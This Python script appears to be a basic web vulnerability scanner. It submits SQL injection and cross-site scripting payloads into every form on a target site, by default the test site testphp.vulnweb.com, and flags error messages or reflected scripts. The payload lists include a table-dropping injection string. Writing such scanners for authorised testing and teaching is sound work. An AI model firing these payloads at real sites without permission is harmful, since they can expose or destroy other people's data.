import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Target URL (change this to your target web app)
TARGET_URL = "http://testphp.vulnweb.com/"

# Common SQL Injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "' OR 'a'='a"
]

# Common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><svg/onload=alert(1)>",
]

# Extract all forms from a webpage
def get_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[!] Error fetching forms: {e}")
        return []

# Extract form details (action, method, inputs)
def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action", "").lower()
        method = form.attrs.get("method", "get").lower()
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})

        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
    except Exception as e:
        print(f"[!] Error parsing form details: {e}")
    return details

# Submit a form with a given payload
def submit_form(form_details, url, payload):
    try:
        # Build full URL (join base URL with form action)
        target_url = urljoin(url, form_details["action"])
        data = {}

        for input_tag in form_details["inputs"]:
            if input_tag["type"] == "text" or input_tag["type"] == "search":
                data[input_tag["name"]] = payload
            else:
                data[input_tag["name"]] = "test"

        # Send request (POST or GET)
        if form_details["method"] == "post":
            return requests.post(target_url, data=data)
        else:
            return requests.get(target_url, params=data)

    except Exception as e:
        print(f"[!] Error submitting form: {e}")
        return None

# Test for SQL Injection
def scan_sql(url):
    forms = get_forms(url)
    print(f"\n[+] Found {len(forms)} forms on {url}")

    for form in forms:
        form_details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            print(f"[>] Testing SQLi payload: {payload}")
            response = submit_form(form_details, url, payload)

            if response and (
                "syntax" in response.text.lower()
                or "sql" in response.text.lower()
                or "mysql" in response.text.lower()
                or "error" in response.text.lower()
            ):
                print(f"[!!!] Possible SQL Injection vulnerability detected at {url}")
                print(f"[!!!] Payload used: {payload}\n")

# Test for XSS
def scan_xss(url):
    forms = get_forms(url)
    print(f"\n[+] Found {len(forms)} forms on {url}")

    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            print(f"[>] Testing XSS payload: {payload}")
            response = submit_form(form_details, url, payload)

            if response and payload in response.text:
                print(f"[!!!] Possible XSS vulnerability detected at {url}")
                print(f"[!!!] Payload used: {payload}\n")

# Main execution
if __name__ == "__main__":
    print("Starting Web Vulnerability Scanner...\n")
    scan_sql(TARGET_URL)
    scan_xss(TARGET_URL)
    print("\nScan complete.")